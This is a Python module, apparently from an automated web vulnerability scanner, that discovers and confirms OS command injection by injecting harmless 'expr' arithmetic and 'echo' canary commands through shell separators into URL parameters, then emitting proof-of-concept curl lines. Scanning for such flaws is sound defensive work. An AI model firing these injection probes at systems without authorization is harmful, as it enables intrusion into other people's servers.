"""Remote Command Execution (RCE) Attack Module (V15).

Verifies arbitrary operating system command execution:
- Mathematical arithmetic canaries: expr 41235 + 23142 -> 64377
- Unique canary token echoes: echo agy_token_...
- Context separators: ;, &&, |, ||, `...`, $(...)
"""

from __future__ import annotations

import logging
import random
import re
import uuid
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from app.attacks.base import AttackPlan, BaseAttackModule, ValidationResult
from app.core.session_context import SessionContext
from app.orchestration.attack_opportunity import AttackOpportunity

logger = logging.getLogger("attacks.rce")


class RCEAttackModule(BaseAttackModule):
    def __init__(self) -> None:
        super().__init__(attack_type="rce", cwe_id="CWE-78", default_severity="CRITICAL")

    async def discover(self, target: str, context: Dict[str, Any]) -> List[AttackOpportunity]:
        opps: List[AttackOpportunity] = []
        urls = context.get("urls", [])
        for u in urls:
            parsed = urlparse(u)
            if parsed.query:
                params = parse_qs(parsed.query)
                for p in params:
                    if any(k in p.lower() for k in ("cmd", "exec", "command", "run", "ping", "daemon", "eval", "cli", "shell", "ip", "host")):
                        opps.append(
                            AttackOpportunity(
                                target=target,
                                endpoint=u,
                                parameter=p,
                                attack_type="rce",
                                hypothesis=f"Command parameter '{p}' on {parsed.path} may allow OS command injection.",
                                priority=98,
                            )
                        )
        return opps

    async def plan(self, opportunity: AttackOpportunity) -> AttackPlan:
        num1 = random.randint(10000, 50000)
        num2 = random.randint(10000, 50000)
        expected = str(num1 + num2)
        canary = f"token_{uuid.uuid4().hex[:6]}"

        return AttackPlan(
            title=f"Command Injection (RCE) Verification on {opportunity.parameter}",
            attack_type="rce",
            target=opportunity.endpoint,
            steps=[
                "1. Baseline response capture",
                f"2. Dispatch mathematical arithmetic probe (expr {num1} + {num2})",
                f"3. Dispatch echo canary token probe (echo {canary})",
                "4. Check for unescaped evaluation of arithmetic or token in response body",
            ],
            payloads=[
                f";expr {num1} + {num2}",
                f"|expr {num1} + {num2}",
                f"$(expr {num1} + {num2})",
                f";echo {canary}",
                f"|echo {canary}",
            ],
            expected_evidence=f"Arithmetic result {expected} or token {canary}",
            context={"parameter": opportunity.parameter, "num1": num1, "num2": num2, "expected": expected, "canary": canary},
        )

    async def validate(self, opportunity: AttackOpportunity, session: SessionContext) -> ValidationResult:
        endpoint = opportunity.endpoint
        param = opportunity.parameter
        if not param:
            return ValidationResult(
                is_vulnerable=False,
                confidence=0.0,
                proof_level="P0",
                attack_type="rce",
                target_url=endpoint,
                message="No parameter specified for RCE testing.",
            )

        parsed = urlparse(endpoint)
        query_params = parse_qs(parsed.query)
        orig_val = query_params.get(param, ["127.0.0.1"])[0]

        # 1. Baseline Request
        baseline_resp = await session.get(endpoint)
        baseline_body = baseline_resp.text

        # 2. Arithmetic Canary Test
        num1 = random.randint(11000, 49000)
        num2 = random.randint(11000, 49000)
        expected_sum = str(num1 + num2)

        test_payloads = [
            f"{orig_val};expr {num1} + {num2}",
            f"{orig_val}|expr {num1} + {num2}",
            f"{orig_val}&&expr {num1} + {num2}",
            f"$(expr {num1} + {num2})",
            f"`expr {num1} + {num2}`",
        ]

        for payload in test_payloads:
            t_params = dict(query_params)
            t_params[param] = [payload]
            probe_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(t_params, doseq=True), parsed.fragment))

            resp = await session.get(probe_url)
            resp_body = resp.text

            # Check if expected arithmetic sum appears cleanly in response and not in baseline
            if expected_sum in resp_body and expected_sum not in baseline_body:
                # Ensure it's not simply echoing the payload string "expr num1 + num2"
                if f"expr {num1} + {num2}" not in resp_body:
                    poc_curl = f"curl -s -k '{probe_url}'"
                    return ValidationResult(
                        is_vulnerable=True,
                        confidence=0.99,
                        proof_level="P4",
                        attack_type="rce",
                        target_url=endpoint,
                        parameter=param,
                        baseline_status=baseline_resp.status_code,
                        exploit_status=resp.status_code,
                        evidence={
                            "payload": payload,
                            "evaluated_arithmetic": f"expr {num1} + {num2} -> {expected_sum}",
                            "response_sample": resp_body[:300],
                        },
                        poc_curl=poc_curl,
                        message=f"CRITICAL: Remote Command Execution (RCE) confirmed on parameter '{param}' via mathematical canary evaluation.",
                        cwe_id="CWE-78",
                        severity="CRITICAL",
                    )

        # 3. Echo Canary Token Test
        canary = f"agy_{uuid.uuid4().hex[:8]}"
        echo_payloads = [f"{orig_val};echo {canary}", f"{orig_val}|echo {canary}", f"{orig_val}&&echo {canary}"]
        for payload in echo_payloads:
            t_params = dict(query_params)
            t_params[param] = [payload]
            probe_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(t_params, doseq=True), parsed.fragment))

            resp = await session.get(probe_url)
            if canary in resp.text and f"echo {canary}" not in resp.text:
                poc_curl = f"curl -s -k '{probe_url}'"
                return ValidationResult(
                    is_vulnerable=True,
                    confidence=0.98,
                    proof_level="P4",
                    attack_type="rce",
                    target_url=endpoint,
                    parameter=param,
                    baseline_status=baseline_resp.status_code,
                    exploit_status=resp.status_code,
                    evidence={"payload": payload, "canary_echoed": canary},
                    poc_curl=poc_curl,
                    message=f"CRITICAL: Remote Command Execution (RCE) confirmed on parameter '{param}' via echo token execution.",
                    cwe_id="CWE-78",
                    severity="CRITICAL",
                )

        return ValidationResult(
            is_vulnerable=False,
            confidence=0.2,
            proof_level="P0",
            attack_type="rce",
            target_url=endpoint,
            parameter=param,
            message=f"Parameter '{param}' did not execute operating system command probes.",
        )
